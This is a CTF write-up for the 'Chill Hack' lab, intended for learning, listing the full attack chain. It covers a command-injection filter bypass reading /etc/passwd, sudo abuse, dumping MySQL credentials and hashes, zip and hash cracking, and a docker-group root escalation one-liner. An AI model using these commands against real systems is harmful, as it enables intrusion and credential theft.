# CTF Writeup: Chill Hack

---

- Step 1: added target_ip to /etc/hosts & scanned ports --> 21,22 & 80 open
- Step 2: since ftp has anonymous user login --> went into it and retrieved notes.txt --> 2 potential users
"Anurodh" & "Apaar"
- Step 3: made gobuster scan found /secret dir --> command executable --> but doesn't get applied because
of filters
- Step 4: tried to look for possible filter bypasses --> found \ --> c\at /etc/passwd
- Step 5: made sudo -l --> runnable script with apaar user --> made sudo -u apaar /home/apaar/.helpline.sh

- Step 6: gained apaar user privs --> in /var/www/files/index.php I gained mysql creds --> root:!@m+her00+@db
- Step 7: made mysql -u root -p --> typed in password --> made SHOW DATABASES; --> made USE webportal; 
--> made SHOW TABLES; --> made SELECT * from users; 
--> retrieved Anurodh:7e53614ced3640d5de23f111806cc4fd
--> retrieved Apaar:686216240e5af30df0501e53c789a649
- Step 8: used crackstation to decode md5hash encrypted passwords --> Apaar--> cullapaar:dontaskdonttell 
--> Anurodh--> Aurick:masterpassword
- Step 9: After some long research, I realized that this was not the right way --> created
python server on rce and made wget on local machine of the .jpg file --> made steghide extract -sf .jpg file
--> retrieved .zip file --> made unzip .zip file --> requires password
- Step 10: made zip2john .zip file > hash
- Step 11: made john hash --wordlist=/usr/share/wordlists/rockyou.txt retrieved password: pass1word
- Step 12: retrieved source_code.php --> cat source_code.php --> retrieved base64 password: IWQwbnRLbjB3bVlwQHNzdzByZA==
- Step 13: made echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d --> !d0ntKn0wmYp@ssw0rd
- Step 14: logged in with Anurodh --> made id --> part of the docker group --> researched on gtfobins for 
good priv escelation since nothing else worked
- Step 15: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
- Step 16: gained root & retrieved flag

---

## Key Learnings

- Learned about command injection filter bypasses --> l/s -la
- Learned about docker exploit --> check id if docker = check exploit
- Added new tool zip2john in to the arsenal
- Further improved MySQL Navigation
